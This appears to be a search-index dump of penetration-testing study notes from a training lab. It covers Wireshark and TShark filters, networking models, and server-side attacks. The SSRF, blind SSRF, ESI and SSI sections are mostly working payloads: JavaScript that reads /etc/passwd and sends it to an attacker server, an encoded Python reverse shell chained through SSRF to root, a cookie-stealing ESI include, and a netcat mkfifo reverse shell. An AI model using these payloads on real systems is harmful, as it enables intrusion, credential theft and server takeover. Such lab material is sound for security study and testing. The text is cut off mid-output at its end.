mechanism. To utilize this feature: right-click on a packet from the stream we wish to recreate. select follow \u2192 TCP this will open a new window with the stream stitched back together. From here, we can see the entire conversation. Alternatively, we can utilize the filter tcp.stream eq # to find and track conversations captured in the pcap file. Notice that the first three packets in the image above have a full TCP handshake. Following those packets, we can see the stream transferring data. We have cleared anything not related out of view by utilizing the filter, and we now can see the conversation in order.","title":"Analyze"},{"location":"network_traffic_analysis/wireshark_advanced_usage/#extracting-files-from-the-gui","text":"Another exciting way to grab data out of the pcap file comes from FTP. * ftp - Will display anything about the FTP protocol. FTP Disector ftp.request.command - Will show any commands sent across the ftp-control channel ( port 21 ) We can look for information like usernames and passwords with this filter. It can also show us filenames for anything requested. ftp-data - Will show any data transferred over the data channel ( port 20 ) If we filter on a conversation and utilize ftp-data , we can capture anything sent during the conversation. We can reconstruct anything transferred by placing the raw data back into a new file and naming it appropriately.","title":"Extracting FIles from the GUI"},{"location":"network_traffic_analysis/wireshark_analysis/","text":"Wireshark is a free and open-source network traffic analyzer much like tcpdump but with a graphical interface. Wireshark is multi-platform and capable of capturing live data off many different interface types (to include WiFi, USB, and Bluetooth) and saving the traffic to several different formats. Wireshark allows the user to dive much deeper into the inspection of network packets than other tools. What makes Wireshark truly powerful is the analysis capability it provides, giving a detailed insight into the traffic. Locating Wireshark hrmns@htb[/htb]$ which wireshark TShark VS. Wireshark (Terminal vs. GUI) \u00b6 TShark is a purpose-built terminal tool based on Wireshark. TShark shares many of the same features that are included in Wireshark and even shares syntax and options. TShark is perfect for use on machines with little or no desktop environment and can easily pass the capture information it receives to another tool via the command line. Basic TShark Switches Switch Command Result D Will display any interfaces available to capture from and then exit out. L Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example) i choose an interface to capture from. (-i eth0) f packet filter in libpcap syntax. Used during capture. c Grab a specific number of packets, then quit the program. Defines a stop condition. a Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets. r (pcap-file) Read from a file. W (pcap-file) Write into a file using the pcapng format. P Will print the packet summary while writing into a file (-W) x will add Hex and ASCII output into the capture. h See the help menu Selecting an Interface & Writing to a File hrmns@htb[/htb]$ sudo tshark -i eth0 -w /tmp/test.pcap Applying Filters hrmns@htb[/htb]$ sudo tshark -i eth0 -f \"host 172.16.146.2\" Capturing on 'eth0' 1 0.000000000 172.16.146.2 \u2192 172.16.146.1 DNS 70 Standard query 0x0804 A github.com 2 0.258861645 172.16.146.1 \u2192 172.16.146.2 DNS 86 Standard query response 0x0804 A github.com A 140.82.113.4 3 0.259866711 172.16.146.2 \u2192 140.82.113.4 TCP 74 48256 \u2192 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1321417850 TSecr=0 WS=128 4 0.299681376 140.82.113.4 \u2192 172.16.146.2 TCP 74 443 \u2192 48256 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1436 SACK_PERM=1 TSval=3885991869 TSecr=1321417850 WS=1024 5 0.299771728 172.16.146.2 \u2192 140.82.113.4 TCP 66 48256 \u2192 443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1321417889 TSecr=3885991869 6 0.306888828 172.16.146.2 \u2192 140.82.113.4 TLSv1 579 Client Hello 7 0.347570701 140.82.113.4 \u2192 172.16.146.2 TLSv1.3 2785 Server Hello, Change Cipher Spec, Application Data, Application Data, Application Data, Application Data 8 0.347653593 172.16.146.2 \u2192 140.82.113.4 TCP 66 48256 \u2192 443 [ACK] Seq=514 Ack=2720 Win=63488 Len=0 TSval=1321417937 TSecr=3885991916 9 0.358887130 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 130 Change Cipher Spec, Application Data 10 0.359781588 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 236 Application Data 11 0.360037927 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 758 Application Data 12 0.360482668 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 258 Application Data 13 0.397331368 140.82.113.4 \u2192 172.16.146.2 TLSv1.3 145 Application Data Termshark \u00b6 Termshark is a Text-based User Interface (TUI) application that provides the user with a Wireshark-like interface right in your terminal window. Termshark can be found at Termshark . It can be built from the source by cloning the repo, or pull down one of the current stable releases from https://github.com/gcla/termshark/releases Wireshark \u00b6 Steps To Start A Capture Capture Filters \u00b6 Capture Filters- are entered before the capture is started. Capture Filters Result host x.x.x.x Capture only traffic pertaining to a certain host net x.x.x.x/24 Capture traffic to or from a specific network (using slash notation to specify the mask) src/dst net x.x.x.x/24 Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network port # will filter out all traffic except the port you specify not port # will capture everything except the port specified port # and # AND will concatenate your specified ports portrange x-x portrange will grab traffic from all ports within the range only ip / ether / tcp These filters will only grab traffic from specified protocol headers. broadcast / multicast / unicast Grabs a specific type of traffic. one to one, one to many, or one to all. Display Filters \u00b6 Display Filters- are used while the capture is running and after the capture has stopped. Display Filters Result ip.addr == x.x.x.x Capture only traffic pertaining to a certain host. This is an OR statement. ip.addr == x.x.x.x/24 Capture traffic pertaining to a specific network. This is an OR statement. ip.src/dst == x.x.x.x Capture traffic to or from a specific host dns / tcp / ftp / arp / ip filter traffic by a specific protocol. There are many more options. tcp.port == x filter by a specific tcp port. src.port / dst.port ==x will capture everything except the port specified and / or / not AND will concatenate, OR will find either of two options, NOT will exclude your input option.","title":"Analysis"},{"location":"network_traffic_analysis/wireshark_analysis/#tshark-vs-wireshark-terminal-vs-gui","text":"TShark is a purpose-built terminal tool based on Wireshark. TShark shares many of the same features that are included in Wireshark and even shares syntax and options. TShark is perfect for use on machines with little or no desktop environment and can easily pass the capture information it receives to another tool via the command line. Basic TShark Switches Switch Command Result D Will display any interfaces available to capture from and then exit out. L Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example) i choose an interface to capture from. (-i eth0) f packet filter in libpcap syntax. Used during capture. c Grab a specific number of packets, then quit the program. Defines a stop condition. a Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets. r (pcap-file) Read from a file. W (pcap-file) Write into a file using the pcapng format. P Will print the packet summary while writing into a file (-W) x will add Hex and ASCII output into the capture. h See the help menu Selecting an Interface & Writing to a File hrmns@htb[/htb]$ sudo tshark -i eth0 -w /tmp/test.pcap Applying Filters hrmns@htb[/htb]$ sudo tshark -i eth0 -f \"host 172.16.146.2\" Capturing on 'eth0' 1 0.000000000 172.16.146.2 \u2192 172.16.146.1 DNS 70 Standard query 0x0804 A github.com 2 0.258861645 172.16.146.1 \u2192 172.16.146.2 DNS 86 Standard query response 0x0804 A github.com A 140.82.113.4 3 0.259866711 172.16.146.2 \u2192 140.82.113.4 TCP 74 48256 \u2192 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1321417850 TSecr=0 WS=128 4 0.299681376 140.82.113.4 \u2192 172.16.146.2 TCP 74 443 \u2192 48256 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1436 SACK_PERM=1 TSval=3885991869 TSecr=1321417850 WS=1024 5 0.299771728 172.16.146.2 \u2192 140.82.113.4 TCP 66 48256 \u2192 443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1321417889 TSecr=3885991869 6 0.306888828 172.16.146.2 \u2192 140.82.113.4 TLSv1 579 Client Hello 7 0.347570701 140.82.113.4 \u2192 172.16.146.2 TLSv1.3 2785 Server Hello, Change Cipher Spec, Application Data, Application Data, Application Data, Application Data 8 0.347653593 172.16.146.2 \u2192 140.82.113.4 TCP 66 48256 \u2192 443 [ACK] Seq=514 Ack=2720 Win=63488 Len=0 TSval=1321417937 TSecr=3885991916 9 0.358887130 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 130 Change Cipher Spec, Application Data 10 0.359781588 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 236 Application Data 11 0.360037927 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 758 Application Data 12 0.360482668 172.16.146.2 \u2192 140.82.113.4 TLSv1.3 258 Application Data 13 0.397331368 140.82.113.4 \u2192 172.16.146.2 TLSv1.3 145 Application Data","title":"TShark VS. Wireshark (Terminal vs. GUI)"},{"location":"network_traffic_analysis/wireshark_analysis/#termshark","text":"Termshark is a Text-based User Interface (TUI) application that provides the user with a Wireshark-like interface right in your terminal window. Termshark can be found at Termshark . It can be built from the source by cloning the repo, or pull down one of the current stable releases from https://github.com/gcla/termshark/releases","title":"Termshark"},{"location":"network_traffic_analysis/wireshark_analysis/#wireshark","text":"Steps To Start A Capture","title":"Wireshark"},{"location":"network_traffic_analysis/wireshark_analysis/#capture-filters","text":"Capture Filters- are entered before the capture is started. Capture Filters Result host x.x.x.x Capture only traffic pertaining to a certain host net x.x.x.x/24 Capture traffic to or from a specific network (using slash notation to specify the mask) src/dst net x.x.x.x/24 Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network port # will filter out all traffic except the port you specify not port # will capture everything except the port specified port # and # AND will concatenate your specified ports portrange x-x portrange will grab traffic from all ports within the range only ip / ether / tcp These filters will only grab traffic from specified protocol headers. broadcast / multicast / unicast Grabs a specific type of traffic. one to one, one to many, or one to all.","title":"Capture Filters"},{"location":"network_traffic_analysis/wireshark_analysis/#display-filters","text":"Display Filters- are used while the capture is running and after the capture has stopped. Display Filters Result ip.addr == x.x.x.x Capture only traffic pertaining to a certain host. This is an OR statement. ip.addr == x.x.x.x/24 Capture traffic pertaining to a specific network. This is an OR statement. ip.src/dst == x.x.x.x Capture traffic to or from a specific host dns / tcp / ftp / arp / ip filter traffic by a specific protocol. There are many more options. tcp.port == x filter by a specific tcp port. src.port / dst.port ==x will capture everything except the port specified and / or / not AND will concatenate, OR will find either of two options, NOT will exclude your input option.","title":"Display Filters"},{"location":"networking/overview/","text":"Networking Models \u00b6 OSI Model \u00b6 Layer Function 7.Application Among other things, this layer controls the input and output of data and provides the application functions. 6.Presentation The presentation layer's task is to transfer the system-dependent presentation of data into a form independent of the application. 5.Session The session layer controls the logical connection between two systems and prevents, for example, connection breakdowns or other problems. 4.Transport Layer 4 is used for end-to-end control of the transferred data. The Transport Layer can detect and avoid congestion situations and segment data streams. 3.Network On the networking layer, connections are established in circuit-switched networks, and data packets are forwarded in packet-switched networks. Data is transmitted over the entire network from the sender to the receiver. 2.Data Link The central task of layer 2 is to enable reliable and error-free transmissions on the respective medium. For this purpose, the bitstreams from layer 1 are divided into blocks or frames. 1.Physical The transmission techniques used are, for example, electrical signals, optical signals, or electromagnetic waves. Through layer 1, the transmission takes place on wired or wireless transmission lines. TCP/IP Model \u00b6 Layer Function 4.Application The Application Layer allows applications to access the other layers' services and defines the protocols applications use to exchange data. 3.Transport The Transport Layer is responsible for providing (TCP) session and (UDP) datagram services for the Application Layer. 2.Internet The Internet Layer is responsible for host addressing, packaging, and routing functions. 1.Link The Link layer is responsible for placing the TCP/IP packets on the network medium and receiving corresponding packets from the network medium. TCP/IP is designed to work independently of the network access method, frame format, and medium.","title":"Overview"},{"location":"networking/overview/#networking-models","text":"","title":"Networking Models"},{"location":"networking/overview/#osi-model","text":"Layer Function 7.Application Among other things, this layer controls the input and output of data and provides the application functions. 6.Presentation The presentation layer's task is to transfer the system-dependent presentation of data into a form independent of the application. 5.Session The session layer controls the logical connection between two systems and prevents, for example, connection breakdowns or other problems. 4.Transport Layer 4 is used for end-to-end control of the transferred data. The Transport Layer can detect and avoid congestion situations and segment data streams. 3.Network On the networking layer, connections are established in circuit-switched networks, and data packets are forwarded in packet-switched networks. Data is transmitted over the entire network from the sender to the receiver. 2.Data Link The central task of layer 2 is to enable reliable and error-free transmissions on the respective medium. For this purpose, the bitstreams from layer 1 are divided into blocks or frames. 1.Physical The transmission techniques used are, for example, electrical signals, optical signals, or electromagnetic waves. Through layer 1, the transmission takes place on wired or wireless transmission lines.","title":"OSI Model"},{"location":"networking/overview/#tcpip-model","text":"Layer Function 4.Application The Application Layer allows applications to access the other layers' services and defines the protocols applications use to exchange data. 3.Transport The Transport Layer is responsible for providing (TCP) session and (UDP) datagram services for the Application Layer. 2.Internet The Internet Layer is responsible for host addressing, packaging, and routing functions. 1.Link The Link layer is responsible for placing the TCP/IP packets on the network medium and receiving corresponding packets from the network medium. TCP/IP is designed to work independently of the network access method, frame format, and medium.","title":"TCP/IP Model"},{"location":"server_side_attacks/blind_ssrf/","text":"Blind SSRF Exploitation Example If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes. Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. <!DOCTYPE html> <html> <body> <a>Hello World!</a> <img src=\"http://<SERVICE IP>:PORT/x?=viaimgtag\"> </body> </html> For the sake of simplicity, the service we will use to test for a blind SSRF vulnerability will be a simple Netcat listener hrmns@htb[/htb]$ sudo nc -nlvp 9090 Listening on 0.0.0.0 9090 After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF. By inspecting the request, we notice wkhtmltopdf in the User-Agent. If we browse wkhtmltopdf's downloads webpage , the below statement catches our attention: Do not use wkhtmltopdf with any untrusted HTML \u2013 be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details. We can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document. < html > < body > < b > Exfiltration via Blind SSRF < /b> < script > var readfile = new XMLHttpRequest (); // Read the local file var exfil = new XMLHttpRequest (); // Send the file to our server readfile . open ( \"GET\" , \"file:///etc/passwd\" , true ); readfile . send (); readfile . onload = function () { if ( readfile . readyState === 4 ) { var url = 'http://<SERVICE IP>:<PORT>/?data=' + btoa ( this . response ); exfil . open ( \"GET\" , url , true ); exfil . send (); } } readfile . onerror = function (){ document . write ( '<a>Oops!</a>' );} < /script> < /body> < /html> Start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed hrmns@htb[/htb]$ sudo nc -nlvp 9090 Listening on 0.0.0.0 9090 GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1 Origin: file:// User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34 Accept: */* Connection: Keep-Alive Accept-Encoding: gzip Accept-Language: en,* Host: 10.10.14.221:9090 Base64 Decoding hrmns@htb[/htb]$ echo \"\"\"cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>\"\"\" | base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin <SNIP> Reverse Shell payload to compromise the underlying server export RHOST=\"<VPN/TUN IP>\";export RPORT=\"<PORT>\";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' We need to URL encode our payload. In this case, we need to encode it twice export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527 Now, let us create an HTML file that performs a GET request to internal.app.local, reaches the local application vulnerable to remote code execution via SSRF, and executes our reverse shell. < html > < body > < b > Reverse Shell via Blind SSRF < /b> < script > var http = new XMLHttpRequest (); http . open ( \"GET\" , \"http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527\" , true ); http . send (); http . onerror = function (){ document . write ( '<a>Oops!</a>' );} < /script> < /body> < /html> Once we start a Netcat listener on our machine and submit the HTML file above, we receive a reverse shell coming from internal.app.local. hrmns@htb[/htb]$ nc -nvlp 9090 listening on [any] 9090 ... Connection received on 10.129.201.238 33100 # whoami whoami root","title":"Blind SSRF Example"},{"location":"server_side_attacks/esi_overview/","text":"Edge Side Includes ( ESI ) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. ESI Tags // Basic detection < esi: include src = http://<PENTESTER IP > > // XSS Exploitation Example < esi: include src = http://<PENTESTER IP > / < XSSPAYLOAD.html > > // Cookie Stealer (bypass httpOnly flag) < esi: include src = http://<PENTESTER IP > /?cookie_stealer.php?=$(HTTP_COOKIE)> // Introduce private local files (Not LFI per se) < esi:include src = \"supersecret.txt\" > // Valid for Akamai, sends debug information in the response < esi:debug />","title":"Overview"},{"location":"server_side_attacks/ssi_example/","text":"Focus on identifying an SSI Injection vulnerability by submitting some of the SSI directives 1. <!--#echo var=\"DATE_LOCAL\" --> 2. <!--#printenv --> Reverse Shell <!--#exec cmd=\"mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo\" -->","title":"Example"},{"location":"server_side_attacks/ssi_overview/","text":"Server-side includes ( SSI ) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are: // Date <!--#echo var=\"DATE_LOCAL\" --> // Modification date of a file <!--#flastmod file=\"index.html\" --> // CGI Program results <!--#include virtual=\"/cgi-bin/counter.pl\" --> // Including a footer <!--#include virtual=\"/footer.html\" --> // Executing commands <!--#exec cmd=\"ls\" --> // Setting variables <!--#set var=\"name\" value=\"Rich\" --> // Including virtual files (same directory) <!--#include virtual=\"file_to_include.html\" --> // Including files (same directory) <!--#include file=\"file_to_include.html\" --> // Print all variables <!--#printenv --> The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives. We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.","title":"Overview"},{"location":"server_side_attacks/ssrf/","text":"Server-Side Request Forgery ( SSRF ) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. SSRF Eample Basic reconnaissance against the host hrmns@htb[/htb]$ nmap -sT -T5 --min-rate = 10000 -p- <TARGET IP> Nmap scan report for <TARGET IP> Host is up (0.00047s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds Interacting with the Target hrmns@htb[/htb]$ curl -i -s http://<TARGET IP> HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 242 Location: http://<TARGET IP>/load?q=index.html Server: Werkzeug/2.0.2 Python Date: Mon, 18 Oct 2021 09:01:02 GMT <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href=\"/load?q=index.html\">/load?q=index.html</a>. If not click the link. We can see the request redirected to /load?q=index.html , meaning the q parameter fetches the resource index.html . Let us follow the redirect to see if we can gather any additional information. hrmns@htb[/htb]$ curl -i -s -L http://<TARGET IP> HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 242 Location: http://<TARGET IP>/load?q=index.html Server: Werkzeug/2.0.2 Python/3.8.12 Date: Mon, 18 Oct 2021 10:20:27 GMT HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 153 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Mon, 18 Oct 2021 10:20:27 GMT <html> <!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter --> <body> <h1>Bad App</h1> <a>Hello World!</a> </body> </html> The next step is to confirm if the q parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. hrmns@htb[/htb]$ nc -nvlp 8080 listening on [any] 8080 ... Now, let us issue a request to the target web application with http://<TUN Adapter IP> instead of index.html hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://<TUN Adapter IP>:8080\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 0 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Mon, 18 Oct 2021 12:07:10 GMT We will receive the following into our Netcat listener confirming the SSRF vulnerability Connection received on <TARGET IP> 49852 GET / HTTP/1.1 Accept-Encoding: identity Host: <VPN/TUN Adapter IP>:8080 User-Agent: Python-urllib/3.8 Connection: close Create a file called index.html < html > </ body > < a > SSRF </ a > < body > < html > Start Python HTTP Server hrmns@htb[/htb]$ python3 -m http.server 9090 Start FTP Server hrmns@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r . Retrieving a remote file through the target application - FTP Schema hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 41 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 11:21:09 GMT <html> </body> <a>SSRF</a> <body> <html> Retrieving a remote file through the target application - HTTP Schema hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 41 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 11:26:18 GMT <html> </body> <a>SSRF</a> <body> <html> Retrieving a local file through the target application - File Schema hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=file:///etc/passwd\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 926 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 11:27:17 GMT root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin <SNIP> Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications Generate a Wordlist hrmns@htb[/htb]$ for port in { 1 ..65535 } ; do echo $port >> ports.txt ; done Issue a cURL request to a random port to get the response size of a request for a non-existent service. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://127.0.0.1:1\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 30 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 11:36:25 GMT [Errno 111] Connection refused Port Fuzzing hrmns@htb[/htb]$ ffuf -w ./ports.txt:PORT -u \"http://<TARGET IP>/load?q=http://127.0.0.1:PORT\" -fs 30 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://<TARGET IP>/load?q=http://127.0.0.1:PORT :: Wordlist : PORT: ./ports.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 30 ________________________________________________ 80 [Status: 200, Size: 153, Words: 11, Lines: 8] 5000 [Status: 200, Size: 64, Words: 3, Lines: 1] :: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 :: We have received a valid response for port 5000 hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://127.0.0.1:5000\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 64 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 11:47:16 GMT <html><body><h1>Hey!</h1><a>Some internal app!</a></body></html> Our ultimate goal is to achieve remote code execution on an internal host. First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the q parameter). hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 83 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 13:51:15 GMT <html> <body> <h1>Internal Web Application</h1> <a>Hello World!</a> </body> </html> Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 97 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 14:52:32 GMT <html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html> We have received an unknown url type error message. It seems the web application is removing :// from our request. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 99 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 14:55:10 GMT <html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html> Ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses hrmns@htb[/htb]$ ffuf -w ./ports.txt:PORT -u \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT\" -fr 'Errno[[:blank:]]111' /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ 